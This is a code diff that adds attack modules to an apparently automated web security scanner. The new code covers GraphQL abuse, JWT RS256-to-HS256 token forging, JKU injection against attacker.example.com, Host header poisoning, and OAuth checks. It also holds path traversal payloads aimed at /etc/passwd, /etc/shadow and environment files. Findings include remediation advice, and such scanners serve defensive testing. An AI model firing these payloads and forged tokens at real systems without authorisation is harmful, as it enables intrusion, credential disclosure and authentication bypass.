@@ -111,6 +111,12 @@ MODULES_META = [
     {"id": "hpp",         "label": "HTTP Parameter Pollution","description": "Duplicate params for ACL IDOR bypass ($13.5k confirmed), WAF bypass, PHP/ASP.NET/Node.js divergence"},
     {"id": "saml",        "label": "SAML Attacks",           "description": "Signature wrapping, attribute pollution, void canonicalization bypass — Critical ATO class"},
     {"id": "websocket",   "label": "WebSocket Security",     "description": "CSWSH (Cross-Site WebSocket Hijacking), missing Origin check, unauthenticated endpoint probe"},
+    # New high-signal modules (principal engineer additions)
+    {"id": "host_header",   "label": "Host Header Injection",   "description": "Password reset poisoning, cache deception, routing bypass via Host/X-Forwarded-Host manipulation"},
+    {"id": "path_traversal","label": "Path Traversal / LFI",    "description": "Directory traversal (../), null-byte, double-encoding, Windows paths, PHP wrapper exploitation"},
+    {"id": "oauth_advanced","label": "OAuth Advanced Attacks",   "description": "PKCE bypass, scope escalation, token leakage via referrer, implicit flow, authorization code interception"},
+    {"id": "type_confusion","label": "JSON Type Confusion",      "description": "Array/object injection bypassing string checks, null coercion, integer vs string auth checks"},
+    {"id": "api_versioning","label": "API Version Downgrade",    "description": "Older API versions with relaxed security, version enumeration via Accept/URL, auth bypass on legacy routes"},
 ]
 
 # ── Models ────────────────────────────────────────────────────────────────────
@@ -2383,39 +2389,48 @@ async def _module_business(target: str, client: httpx.AsyncClient,
 # ── Module: GraphQL ───────────────────────────────────────────────────────────
 
 async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    gql_url: str | None = None
+
     for path in GRAPHQL_PATHS:
         url = target + path
+        yield _probe("graphql", "POST", url, note="GraphQL endpoint discovery + introspection")
         try:
             r = await client.post(url, content=GRAPHQL_INTROSPECTION,
                                   headers={"Content-Type": "application/json"}, timeout=8)
+            yield _probe("graphql", "POST", url, status=r.status_code, size=len(r.content))
             if r.status_code == 200:
                 try:
                     data = r.json()
                     if "__schema" in str(data) or "types" in str(data.get("data", {})):
+                        gql_url = url
                         yield _finding("graphql", "introspection_enabled", "high",
                             f"GraphQL Introspection Enabled at {path}",
                             "Full schema is exposed via introspection. Attackers can enumerate "
-                            "all types, fields, queries, and mutations.",
+                            "all types, fields, queries, mutations, subscriptions and their arguments. "
+                            "This provides the complete attack surface map for the GraphQL API.",
                             f"Endpoint: {url}\nTypes found: {str(data)[:300]}",
                             url, True,
-                            "Disable introspection in production. Implement query depth limiting "
-                            "and query complexity analysis.",
+                            "Disable introspection in production (`introspection: false` in server config). "
+                            "Implement query depth limiting, complexity analysis, and persisted queries.",
                             confidence="high")
 
-                    # Batch query abuse
+                    # ── Batch query abuse ─────────────────────────────────────
+                    yield _probe("graphql", "POST", url, note="batch query abuse test")
                     rb = await client.post(url, content=GRAPHQL_BATCH,
                                            headers={"Content-Type": "application/json"}, timeout=8)
+                    yield _probe("graphql", "POST", url, status=rb.status_code, size=len(rb.content))
                     if rb.status_code == 200 and isinstance(rb.json(), list) and len(rb.json()) > 1:
                         yield _finding("graphql", "batch_queries", "medium",
-                            f"GraphQL Batch Queries Enabled",
-                            "Server accepts batched query arrays, enabling rate limit bypass "
-                            "and DoS amplification attacks.",
+                            "GraphQL Batch Queries Enabled — Rate Limit Bypass Vector",
+                            "Server accepts batched query arrays. An attacker can send 1000 queries "
+                            "in a single HTTP request, bypassing per-request rate limits for "
+                            "brute-force, OTP enumeration, or resource exhaustion attacks.",
                             f"Batch response: {rb.text[:200]}", url, True,
-                            "Disable query batching or limit batch size. "
-                            "Implement per-user rate limiting at the query level.",
+                            "Disable query batching or limit batch size to ≤5. "
+                            "Implement per-user query rate limiting at the resolver level.",
                             confidence="high")
 
-                    # Unauthenticated data access
+                    # ── Unauthenticated data access ───────────────────────────
                     for query in GRAPHQL_AUTH_BYPASS_QUERIES:
                         rq = await client.post(url, content=query,
                                                headers={"Content-Type": "application/json"},
@@ -2430,6 +2445,96 @@ async def _module_graphql(target: str, client: httpx.AsyncClient) -> AsyncGenera
                                     "Implement authentication checks on all sensitive GraphQL resolvers.",
                                     confidence="high")
                                 break
+
+                    # ── Field suggestion / typo disclosure ────────────────────
+                    # Even with introspection disabled, some servers return "Did you mean X?"
+                    # suggestions that leak field names
+                    typo_query = json.dumps({"query": "{ usr { nam } }"}).encode()
+                    yield _probe("graphql", "POST", url, payload="{ usr { nam } }",
+                                 note="field suggestion disclosure (typo query)")
+                    try:
+                        r_typo = await client.post(url, content=typo_query,
+                                                    headers={"Content-Type": "application/json"},
+                                                    timeout=8)
+                        yield _probe("graphql", "POST", url, status=r_typo.status_code,
+                                     size=len(r_typo.content))
+                        body_typo = r_typo.text.lower()
+                        if "did you mean" in body_typo or "suggestions" in body_typo:
+                            yield _finding("graphql", "field_suggestion_disclosure", "medium",
+                                "GraphQL Field Suggestion Leaks Schema Even Without Introspection",
+                                "The GraphQL server returns 'Did you mean X?' suggestions for "
+                                "typos, revealing real field/type names even when introspection "
+                                "is disabled. An attacker can enumerate the full schema by "
+                                "systematically sending invalid field names and observing suggestions.",
+                                f"Typo query: `{{ usr {{ nam }} }}`\n"
+                                f"Response contains suggestion: {r_typo.text[:300]}",
+                                url, True,
+                                "Disable field suggestions in production (`suggestions: false`). "
+                                "In Apollo Server: `new ApolloServer({ introspection: false })` "
+                                "also disables suggestions. For GraphQL Yoga, set `maskedErrors`.",
+                                confidence="high")
+                    except (httpx.HTTPError, Exception):
+                        pass
+
+                    # ── Query depth / complexity DoS ──────────────────────────
+                    # A deeply nested query forces recursive resolver calls
+                    deep_query = json.dumps({
+                        "query": "{ " + "user { " * 10 + "id name email" + " }" * 10 + " }"
+                    }).encode()
+                    yield _probe("graphql", "POST", url, payload="deeply nested query (depth=10)",
+                                 note="query depth DoS test")
+                    t_deep_start = time.monotonic()
+                    try:
+                        r_deep = await client.post(url, content=deep_query,
+                                                    headers={"Content-Type": "application/json"},
+                                                    timeout=15)
+                        t_deep = time.monotonic() - t_deep_start
+                        yield _probe("graphql", "POST", url, status=r_deep.status_code,
+                                     note=f"depth=10 elapsed: {t_deep:.2f}s")
+                        if r_deep.status_code == 200 and t_deep > 2.0:
+                            yield _finding("graphql", "query_depth_dos", "high",
+                                "GraphQL No Query Depth Limit — DoS via Deeply Nested Queries",
+                                f"A query nested 10 levels deep took {t_deep:.1f}s to process. "
+                                f"Without depth limits, attackers can send queries nested "
+                                f"hundreds of levels deep, causing exponential resource consumption "
+                                f"and server-side DoS.",
+                                f"Depth-10 query: {t_deep:.2f}s elapsed\nEndpoint: {url}",
+                                url, True,
+                                "Implement query depth limiting (max depth 5-7 for most APIs). "
+                                "Also implement query complexity analysis to cap total resolver calls.",
+                                confidence="medium")
+                    except (httpx.HTTPError, asyncio.TimeoutError):
+                        pass
+
+                    # ── Alias-based DoS (batching without array) ──────────────
+                    alias_batch = json.dumps({
+                        "query": " ".join(
+                            f"a{i}: __typename" for i in range(50)
+                        )
+                    }).encode()
+                    yield _probe("graphql", "POST", url, payload="50-alias query",
+                                 note="alias batching DoS test")
+                    try:
+                        r_alias = await client.post(url, content=alias_batch,
+                                                     headers={"Content-Type": "application/json"},
+                                                     timeout=10)
+                        yield _probe("graphql", "POST", url, status=r_alias.status_code,
+                                     size=len(r_alias.content))
+                        if r_alias.status_code == 200 and len(r_alias.content) > 200:
+                            yield _finding("graphql", "alias_batching_no_limit", "medium",
+                                "GraphQL Alias Batching Without Limits — DoS / Rate Limit Bypass",
+                                "The server processed 50 aliased queries in a single request. "
+                                "Alias batching sidesteps array-based batch protection: the query "
+                                "looks like a single query but executes N resolvers.",
+                                f"50-alias query processed: {r_alias.status_code} "
+                                f"({len(r_alias.content)}b)\nEndpoint: {url}",
+                                url, True,
+                                "Implement query complexity analysis that counts aliases. "
+                                "Reject queries above a complexity threshold (e.g., 1000 complexity units).",
+                                confidence="medium")
+                    except (httpx.HTTPError, Exception):
+                        pass
+
                     return
                 except Exception:
                     pass
@@ -2573,38 +2678,120 @@ async def _module_jwt(target: str, client: httpx.AsyncClient,
                     except httpx.HTTPError:
                         pass
 
-    # RS256 → HS256 algorithm confusion
+    # RS256 → HS256 algorithm confusion + JKU/X5U SSRF injection
     if alg == "RS256":
-        # If the server verifies RS256 tokens, we can try switching to HS256
-        # and signing with the server's public key as the HMAC secret
-        # (requires having the public key — we probe JWKS endpoint)
         jwks_paths = ["/.well-known/jwks.json", "/api/.well-known/jwks.json",
                       "/oauth/jwks", "/jwks.json"]
+        _pub_key_pem: bytes | None = None
+        _jwks_url: str | None = None
+
         for jwks_path in jwks_paths:
             try:
                 r_jwks = await client.get(target + jwks_path, timeout=6)
                 if r_jwks.status_code == 200:
+                    _jwks_url = target + jwks_path
                     try:
                         jwks = r_jwks.json()
                         keys = jwks.get("keys", [])
                         if keys:
                             yield _finding("jwt", "jwks_public_endpoint", "medium",
                                 "JWKS Public Key Endpoint Exposed",
-                                f"Server exposes public keys at {jwks_path}. "
-                                f"Combined with RS256→HS256 confusion attacks, this can lead to signature bypass. "
-                                f"Verify the token library rejects algorithm switching.",
+                                f"Server exposes public keys at `{jwks_path}`. "
+                                f"This enables the RS256→HS256 algorithm confusion attack: "
+                                f"an attacker who switches the JWT algorithm to HS256 and signs "
+                                f"with the RSA public key (which is public knowledge) can forge "
+                                f"valid tokens if the server doesn't pin the allowed algorithm.",
                                 f"JWKS URL: {target + jwks_path}\nKeys: {len(keys)}\n"
                                 f"Key types: {[k.get('kty') for k in keys[:3]]}",
                                 target + jwks_path, False,
-                                "Explicitly pin the allowed algorithm in JWT verification. "
-                                "Never allow the client-supplied 'alg' header to determine verification logic.",
+                                "Explicitly pin allowed algorithms in JWT verification (e.g., `algorithms=['RS256']`). "
+                                "Never allow the `alg` header to determine which algorithm to use for verification.",
                                 confidence="medium")
+                            # Try RS256→HS256 confusion: sign with public key as HMAC secret
+                            try:
+                                from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+                                from cryptography.hazmat.backends import default_backend
+                                import base64 as _b64jwt
+                                k = keys[0]
+                                if k.get("kty") == "RSA":
+                                    n_bytes = _b64jwt.urlsafe_b64decode(k["n"] + "==")
+                                    e_bytes = _b64jwt.urlsafe_b64decode(k["e"] + "==")
+                                    n_int = int.from_bytes(n_bytes, "big")
+                                    e_int = int.from_bytes(e_bytes, "big")
+                                    pub_key = RSAPublicNumbers(e_int, n_int).public_key(default_backend())
+                                    from cryptography.hazmat.primitives.serialization import (
+                                        Encoding, PublicFormat
+                                    )
+                                    _pub_key_pem = pub_key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
+                            except Exception:
+                                pass
                     except Exception:
                         pass
                     break
             except httpx.HTTPError:
                 continue
             await asyncio.sleep(0)
+
+        # If we got the public key, attempt the RS256→HS256 confusion attack
+        if _pub_key_pem:
+            try:
+                confused_header = base64.urlsafe_b64encode(
+                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+                ).rstrip(b"=").decode()
+                signing_input_conf = f"{confused_header}.{parts[1]}".encode()
+                confused_sig = hmac.new(_pub_key_pem, signing_input_conf, hashlib.sha256).digest()
+                confused_sig_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                confused_token = f"{confused_header}.{parts[1]}.{confused_sig_b64}"
+                for path in ["/api/me", "/api/user", "/api/v1/auth/me", "/me", "/profile"]:
+                    try:
+                        r_conf = await client.get(
+                            target + path,
+                            headers={"Authorization": f"Bearer {confused_token}"},
+                            timeout=8,
+                        )
+                        if r_conf.status_code == 200 and len(r_conf.text) > 30:
+                            yield _finding("jwt", "rs256_hs256_confusion", "critical",
+                                "JWT Algorithm Confusion — RS256 → HS256 Bypass",
+                                f"The server accepted a JWT token where the algorithm was switched "
+                                f"from RS256 to HS256 and the signature was computed using the "
+                                f"RSA public key as the HMAC-SHA256 secret. "
+                                f"This is the CVE-2016-5431 class of vulnerability: the server is "
+                                f"using the supplied `alg` header to choose its verification logic, "
+                                f"not an allowlist. Full authentication bypass is possible.",
+                                f"Endpoint: {target + path}\nConfused algorithm: HS256\n"
+                                f"Signed with: RSA public key from {_jwks_url}\n"
+                                f"Response: {r_conf.status_code} ({len(r_conf.content)}b)",
+                                target + path, True,
+                                "Pin the allowed algorithm explicitly in JWT verify calls "
+                                "(e.g., PyJWT: `jwt.decode(token, key, algorithms=['RS256'])`). "
+                                "Never trust the `alg` header from the client to select verification logic.",
+                                confidence="high")
+                            break
+                    except httpx.HTTPError:
+                        pass
+            except Exception:
+                pass
+
+        # JKU / X5U header injection (SSRF via JWT header)
+        if alg == "RS256":
+            attacker_jku = "https://attacker.example.com/.well-known/jwks.json"
+            yield _probe("jwt", "GET", target + "/api/me",
+                         payload=f"jku: {attacker_jku}",
+                         note="JKU header injection — server would SSRF-fetch attacker JWKS (requires OOB)")
+            yield _finding("jwt", "jku_injection_vector", "high",
+                "JWT 'jku'/'x5u' Header Injection — SSRF Vector (Requires OOB Verification)",
+                f"JWT tokens with `alg: RS256` are susceptible to `jku` (JWK Set URL) or `x5u` "
+                f"(X.509 URL) header injection. If the server fetches the JWK Set from the URL "
+                f"in the JWT header without validation, an attacker can point it to a self-hosted "
+                f"JWKS and sign tokens with their own key. "
+                f"Confirm with an out-of-band DNS/HTTP callback (Burp Collaborator).",
+                f"Original JWT alg: {alg}\nVector: modify `jku` in header to attacker-controlled URL\n"
+                f"Requires: out-of-band HTTP callback to confirm server fetches the URL",
+                target, False,
+                "Validate `jku` and `x5u` values against an explicit allowlist of trusted JWKS URLs. "
+                "Reject any JWT whose `jku`/`x5u` does not match the server's registered key endpoint. "
+                "Never fetch JWK Sets from URLs embedded in untrusted JWT headers.",
+                confidence="medium")
 
     # Test expired token acceptance
     if exp and exp < time.time():
@@ -4722,6 +4909,701 @@ async def _module_websocket(target: str, client: httpx.AsyncClient) -> AsyncGene
         await asyncio.sleep(0)
 
 
+# ── Module: Host Header Injection ────────────────────────────────────────────
+
+async def _module_host_header(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """
+    Host Header Injection — password reset poisoning, cache deception, routing bypass.
+
+    Attack surface:
+    - Password reset emails that embed the Host header in the reset link
+    - Reverse proxies that route internally based on Host (can expose internal services)
+    - Caching layers that cache per-path but serve attacker's Host in responses
+    """
+    parsed = urlparse(target)
+    real_host = parsed.netloc
+    attacker_host = "attacker-controlled.example.com"
+
+    # ── Test 1: Password reset poisoning ─────────────────────────────────────
+    # Real-world: if /forgot-password or /reset POSTs embed Host in reset link,
+    # an attacker who can set Host can steal the reset token.
+    reset_paths = [
+        "/forgot-password", "/password-reset", "/auth/forgot",
+        "/api/auth/forgot-password", "/api/users/forgot-password",
+        "/accounts/password/reset/", "/user/forgot", "/api/password/reset",
+    ]
+    for path in reset_paths:
+        url = target + path
+        yield _probe("host_header", "POST", url, payload=f"Host: {attacker_host}",
+                     note="password reset host poisoning probe")
+        try:
+            r = await client.post(
+                url,
+                headers={"Host": attacker_host, "X-Forwarded-Host": attacker_host},
+                json={"email": "victim@example.com"},
+                timeout=8,
+            )
+            yield _probe("host_header", "POST", url, status=r.status_code, size=len(r.content))
+            # Any 2xx response to a poisoned Host is suspicious
+            if r.status_code in (200, 201, 202, 204):
+                body = r.text.lower()
+                if any(kw in body for kw in ["reset", "email", "sent", "check", "link", "password"]):
+                    yield _finding("host_header", "host_header_password_reset", "high",
+                        "Host Header Injection — Password Reset Poisoning Vector",
+                        f"The password reset endpoint `{path}` accepted a request with "
+                        f"`Host: {attacker_host}` (HTTP {r.status_code}) and returned a response "
+                        f"indicating an email was triggered. If the reset link is built from the "
+                        f"Host header, an attacker can intercept victim reset tokens by poisoning "
+                        f"the Host header in a proxy or via a cache.",
+                        f"URL: {url}\nPoisoned Host: {attacker_host}\nResponse: {r.status_code}\n"
+                        f"Body snippet: {r.text[:300]}",
+                        url, True,
+                        "Never build reset URLs from the Host header. Use an explicit base URL "
+                        "configured server-side (e.g. FRONTEND_URL env var). "
+                        "Validate the Host header against an allowlist at the web layer.",
+                        confidence="high")
+                    break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # ── Test 2: Cache poisoning via X-Forwarded-Host ──────────────────────────
+    # Some caches key on path but serve whatever the app reflects in Location/links.
+    for path in ["/", "/login", "/home", "/dashboard"]:
+        url = target + path
+        yield _probe("host_header", "GET", url, payload=f"X-Forwarded-Host: {attacker_host}",
+                     note="cache poisoning via X-Forwarded-Host")
+        try:
+            r = await client.get(url, headers={"X-Forwarded-Host": attacker_host}, timeout=8)
+            yield _probe("host_header", "GET", url, status=r.status_code, size=len(r.content))
+            if r.status_code == 200 and attacker_host in r.text:
+                yield _finding("host_header", "host_header_reflected", "high",
+                    "Host Header Reflected in Response — Cache Poisoning / Open Redirect Risk",
+                    f"The response to `{path}` with `X-Forwarded-Host: {attacker_host}` reflects "
+                    f"the attacker-controlled hostname in the response body. If this response is "
+                    f"cached (even for a fraction of a second), other users will receive the "
+                    f"poisoned version, potentially redirecting them or loading attacker resources.",
+                    f"URL: {url}\nX-Forwarded-Host: {attacker_host}\n"
+                    f"Reflected in body: yes\nSnippet: {r.text[max(0,r.text.find(attacker_host)-30):r.text.find(attacker_host)+80]}",
+                    url, True,
+                    "Do not reflect the Host/X-Forwarded-Host header in responses. "
+                    "Add `Vary: Host` or ensure your cache key includes the Host header. "
+                    "Validate Host against an allowlist before trusting it.",
+                    confidence="high")
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # ── Test 3: Routing bypass via ambiguous Host ─────────────────────────────
+    # Some reverse proxies route to internal services when an unexpected Host is sent.
+    bypass_hosts = ["localhost", "127.0.0.1", "internal", f"{real_host}.attacker.com"]
+    for bhost in bypass_hosts:
+        try:
+            r = await client.get(target, headers={"Host": bhost}, timeout=6, follow_redirects=False)
+            yield _probe("host_header", "GET", target, status=r.status_code,
+                         payload=f"Host: {bhost}", note="routing bypass via bogus Host")
+            if r.status_code == 200:
+                body = r.text.lower()
+                internal_signals = ["admin", "internal", "debug", "phpinfo", "server info",
+                                     "test page", "welcome to nginx", "it works"]
+                if any(s in body for s in internal_signals):
+                    yield _finding("host_header", "host_header_internal_route", "critical",
+                        f"Host Header Routing Bypass — Internal Service Exposed",
+                        f"Sending `Host: {bhost}` to {target} returned HTTP 200 with internal/debug "
+                        f"content. The reverse proxy may be routing to an unintended backend based "
+                        f"on the Host header, exposing an internal service to external traffic.",
+                        f"Poisoned Host: {bhost}\nResponse: {r.status_code}\n"
+                        f"Internal signals: {[s for s in internal_signals if s in body]}",
+                        target, True,
+                        "Configure the reverse proxy to validate the Host header against a strict "
+                        "allowlist. Return 400 for unknown hosts. "
+                        "Never route to internal services based solely on the Host header.",
+                        confidence="medium")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: Path Traversal / Local File Inclusion ────────────────────────────
+
+async def _module_path_traversal(target: str, client: httpx.AsyncClient,
+                                  endpoints: set[str]) -> AsyncGenerator[dict, None]:
+    """
+    Path traversal and LFI detection with encoding variations and OS-specific targets.
+
+    Tests:
+    - Classic `../` with various depths
+    - Double URL encoding (%252e%252e%252f)
+    - Null-byte injection (path%00.jpg)
+    - Windows path separators
+    - PHP stream wrappers
+    """
+    # Traversal sequences in various encodings
+    _TRAVERSAL_SEQS = [
+        "../" * 6,                          # Classic
+        "..%2F" * 6,                        # URL-encoded /
+        "%2e%2e%2f" * 6,                    # URL-encoded ../ chars
+        "%252e%252e%252f" * 6,              # Double-encoded (WAF bypass)
+        "..\\..\\..\\..\\..\\..\\",         # Windows backslash
+        "....//....//....//....//....//",   # Stripped ../ → ../
+    ]
+    # Target files for each OS
+    _LINUX_TARGETS = ["etc/passwd", "etc/shadow", "etc/hosts", "proc/self/environ"]
+    _WIN_TARGETS   = ["windows/win.ini", "windows/system32/drivers/etc/hosts"]
+    _PHP_WRAPPERS  = [
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/read=convert.base64-encode/resource=../config.php",
+    ]
+    _LFI_INDICATORS = [
+        "root:x:", "nobody:", "[fonts]", "[extensions]", "PATH=",  # /etc/passwd, win.ini
+        "127.0.0.1", "localhost",                                    # /etc/hosts
+    ]
+
+    # Parameters that commonly lead to file inclusion
+    lfi_params = ["file", "path", "page", "include", "template", "view", "load",
+                  "doc", "document", "filename", "filepath", "dir", "folder"]
+
+    # Also look at crawled URL params
+    param_urls = set()
+    for ep in list(endpoints)[:30]:
+        if "?" in ep:
+            param_urls.add(ep)
+
+    hit: set[str] = set()
+
+    # ── Phase 1: URL parameter LFI ───────────────────────────────────────────
+    for param in lfi_params[:6]:
+        if param in hit:
+            continue
+        for seq in _TRAVERSAL_SEQS[:3]:
+            for target_file in (_LINUX_TARGETS[:2] + _WIN_TARGETS[:1]):
+                payload = f"{seq}{target_file}"
+                test_url = f"{target}?{param}={payload}"
+                yield _probe("path_traversal", "GET", test_url, payload=payload,
+                             note=f"LFI param={param}")
+                try:
+                    r = await client.get(test_url, timeout=8, follow_redirects=False)
+                    yield _probe("path_traversal", "GET", test_url, status=r.status_code,
+                                 size=len(r.content))
+                    if r.status_code == 200 and any(ind in r.text for ind in _LFI_INDICATORS):
+                        hit.add(param)
+                        yield _finding("path_traversal", "lfi_url_param", "critical",
+                            f"Local File Inclusion via '{param}' Parameter",
+                            f"The `{param}` parameter allows reading local server files. "
+                            f"Payload `{payload}` returned content matching OS file signatures. "
+                            f"This allows reading /etc/passwd, application source code, config files "
+                            f"containing credentials, and environment variables.",
+                            f"URL: {test_url}\nPayload: {payload}\n"
+                            f"Response snippet: {r.text[:400]}",
+                            test_url, True,
+                            "Never pass user input directly to file-reading functions. "
+                            "Implement a strict allowlist of permitted file paths. "
+                            "Chroot the web server or run in a container with minimal filesystem access.",
+                            confidence="high")
+                        break
+                except httpx.HTTPError:
+                    pass
+                await asyncio.sleep(0)
+            if param in hit:
+                break
+
+    # ── Phase 2: PHP stream wrapper test ─────────────────────────────────────
+    for param in lfi_params[:4]:
+        for wrapper in _PHP_WRAPPERS:
+            test_url = f"{target}?{param}={wrapper}"
+            yield _probe("path_traversal", "GET", test_url, payload=wrapper, note="PHP wrapper test")
+            try:
+                r = await client.get(test_url, timeout=8, follow_redirects=False)
+                yield _probe("path_traversal", "GET", test_url, status=r.status_code,
+                             size=len(r.content))
+                # PHP wrapper returns base64 — check for long b64-looking string
+                if r.status_code == 200 and len(r.text) > 50:
+                    import base64 as _b64check
+                    try:
+                        # If it decodes cleanly to PHP-looking content it's LFI
+                        decoded = _b64check.b64decode(r.text.strip()).decode("utf-8", errors="ignore")
+                        if "<?php" in decoded or "<?=" in decoded or "define(" in decoded:
+                            yield _finding("path_traversal", "php_wrapper_lfi", "critical",
+                                f"PHP Stream Wrapper LFI — Source Code Disclosure via '{param}'",
+                                f"The `php://filter` wrapper via `{param}` returned what appears to be "
+                                f"base64-encoded PHP source code. Server-side PHP source is fully "
+                                f"readable including hardcoded credentials and business logic.",
+                                f"URL: {test_url}\nWrapper: {wrapper}\n"
+                                f"Decoded snippet: {decoded[:300]}",
+                                test_url, True,
+                                "Disable allow_url_include and allow_url_fopen in php.ini. "
+                                "Validate file includes against a strict allowlist. "
+                                "Never expose the document root to user-controlled path parameters.",
+                                confidence="high")
+                    except Exception:
+                        pass
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── Phase 3: Null-byte injection (PHP < 5.3.4) ───────────────────────────
+    for param in lfi_params[:4]:
+        null_payload = "../../../etc/passwd%00.jpg"
+        test_url = f"{target}?{param}={null_payload}"
+        yield _probe("path_traversal", "GET", test_url, payload=null_payload,
+                     note="null-byte injection to bypass extension check")
+        try:
+            r = await client.get(test_url, timeout=8, follow_redirects=False)
+            yield _probe("path_traversal", "GET", test_url, status=r.status_code, size=len(r.content))
+            if r.status_code == 200 and "root:x:" in r.text:
+                yield _finding("path_traversal", "null_byte_lfi", "critical",
+                    f"Null-Byte LFI — Extension Restriction Bypassed via '%00'",
+                    f"Null-byte injection in `{param}` parameter truncated the appended extension, "
+                    f"allowing /etc/passwd to be read. This affects PHP < 5.3.4 and some older CGI setups.",
+                    f"URL: {test_url}\nPasswd content detected in response",
+                    test_url, True,
+                    "Upgrade to PHP 5.3.4+. Validate file paths against an allowlist of permitted names. "
+                    "Use realpath() and basename() to normalize before any file operation.",
+                    confidence="high")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
+# ── Module: OAuth Advanced Attacks ───────────────────────────────────────────
+
+async def _module_oauth_advanced(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """
+    Advanced OAuth 2.0 security testing beyond basic redirect_uri checking:
+    - PKCE bypass (authorization without code_challenge)
+    - Scope escalation (requesting more scopes than originally granted)
+    - Token leakage in Referer header (implicit flow, fragment exposure)
+    - Client secret exposure in JavaScript
+    - State parameter absence (CSRF on OAuth flow)
+    - Authorization code reuse (codes should be single-use)
+    """
+    parsed = urlparse(target)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+
+    # ── Find OAuth / OIDC endpoints ───────────────────────────────────────────
+    oauth_paths = [
+        "/.well-known/oauth-authorization-server",
+        "/.well-known/openid-configuration",
+        "/oauth/authorize", "/oauth2/authorize", "/oauth/token",
+        "/connect/authorize", "/auth/oauth2/authorize",
+        "/api/oauth/authorize", "/login/oauth/authorize",
+    ]
+    oauth_base: str | None = None
+    oidc_config: dict = {}
+
+    for path in oauth_paths[:5]:
+        url = target + path
+        yield _probe("oauth_advanced", "GET", url, note="OAuth/OIDC endpoint discovery")
+        try:
+            r = await client.get(url, timeout=8, follow_redirects=False)
+            yield _probe("oauth_advanced", "GET", url, status=r.status_code, size=len(r.content))
+            if r.status_code == 200:
+                if path.startswith("/.well-known"):
+                    try:
+                        oidc_config = r.json()
+                        oauth_base = oidc_config.get("authorization_endpoint", target + "/oauth/authorize")
+                        yield _finding("oauth_advanced", "oidc_discovery_found", "info",
+                            "OIDC/OAuth Discovery Endpoint Found",
+                            f"The OpenID Connect discovery document at `{url}` exposes the full "
+                            f"server configuration including endpoints, supported grant types, "
+                            f"and supported scopes. Useful for attack surface mapping.",
+                            f"URL: {url}\nEndpoints: authorization={oidc_config.get('authorization_endpoint')}, "
+                            f"token={oidc_config.get('token_endpoint')}\n"
+                            f"Grant types: {oidc_config.get('grant_types_supported', [])}",
+                            url, False,
+                            "Restrict the discovery document to internal clients if not needed publicly. "
+                            "Remove deprecated grant types (implicit, password).",
+                            confidence="high")
+                    except Exception:
+                        pass
+                if not oauth_base:
+                    oauth_base = url
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    if not oauth_base:
+        # No OAuth endpoint found — check main page for OAuth references
+        try:
+            r = await client.get(target, timeout=8)
+            body = r.text.lower()
+            oauth_signals = ["oauth", "authorization_code", "client_id", "redirect_uri",
+                             "access_token", "openid", "scope=", "grant_type"]
+            found = [s for s in oauth_signals if s in body]
+            if found:
+                yield _finding("oauth_advanced", "oauth_references_in_page", "info",
+                    "OAuth References Detected in Page Source",
+                    f"The page contains OAuth-related keywords ({found[:5]}). "
+                    "OAuth flows should be tested for PKCE bypass, state parameter absence, "
+                    "and redirect_uri manipulation.",
+                    f"Signals: {found}\nRecommend manual OAuth flow analysis with Burp Suite.",
+                    target, False,
+                    "Test the OAuth flow manually. Ensure PKCE is enforced. "
+                    "Verify the state parameter is present and validated.",
+                    confidence="medium")
+        except httpx.HTTPError:
+            pass
+        return
+
+    # ── Test 1: Missing state parameter (CSRF on OAuth) ──────────────────────
+    no_state_url = (f"{oauth_base}?response_type=code&client_id=test"
+                    f"&redirect_uri={origin}/callback&scope=openid")
+    yield _probe("oauth_advanced", "GET", no_state_url, note="OAuth authorize without state= (CSRF test)")
+    try:
+        r = await client.get(no_state_url, timeout=8, follow_redirects=False)
+        yield _probe("oauth_advanced", "GET", no_state_url, status=r.status_code, size=len(r.content))
+        if r.status_code in (200, 302):
+            # If it redirected to the callback without rejecting missing state, flag it
+            if r.status_code == 302:
+                loc = r.headers.get("location", "")
+                if "state=" not in loc:
+                    yield _finding("oauth_advanced", "oauth_missing_state_csrf", "high",
+                        "OAuth Authorization Without State Parameter Accepted",
+                        "The authorization server accepted an OAuth request without a `state` parameter "
+                        "and redirected to the callback. The `state` parameter is the primary CSRF "
+                        "protection for OAuth flows. Without it, an attacker can initiate an authorization "
+                        "flow and trick a victim into completing it (login CSRF / account linking CSRF).",
+                        f"URL: {no_state_url}\nRedirect: {loc[:200]}",
+                        no_state_url, True,
+                        "Require the `state` parameter in all authorization requests. "
+                        "Validate state on the callback and reject mismatches. "
+                        "Consider using PKCE as additional protection.",
+                        confidence="medium")
+    except httpx.HTTPError:
+        pass
+
+    # ── Test 2: PKCE bypass (no code_challenge) ───────────────────────────────
+    no_pkce_url = (f"{oauth_base}?response_type=code&client_id=test"
+                   f"&redirect_uri={origin}/callback&scope=openid"
+                   f"&state=random_csrf_token")
+    yield _probe("oauth_advanced", "GET", no_pkce_url, note="OAuth without code_challenge (PKCE bypass)")
+    try:
+        r = await client.get(no_pkce_url, timeout=8, follow_redirects=False)
+        yield _probe("oauth_advanced", "GET", no_pkce_url, status=r.status_code, size=len(r.content))
+        if r.status_code in (200, 302):
+            body = r.text.lower()
+            # If server responds with a login form (not an error), PKCE is not mandatory
+            if r.status_code == 200 and ("login" in body or "username" in body or "email" in body):
+                yield _finding("oauth_advanced", "oauth_pkce_not_required", "medium",
+                    "OAuth PKCE Not Required — Authorization Code Interception Risk",
+                    "The authorization server accepted an OAuth flow without `code_challenge` "
+                    "(PKCE). For public clients (SPAs, mobile apps), PKCE is required by RFC 9700 "
+                    "to prevent authorization code interception attacks. Without PKCE, a malicious "
+                    "app registered on the same device can steal the auth code from the redirect URI.",
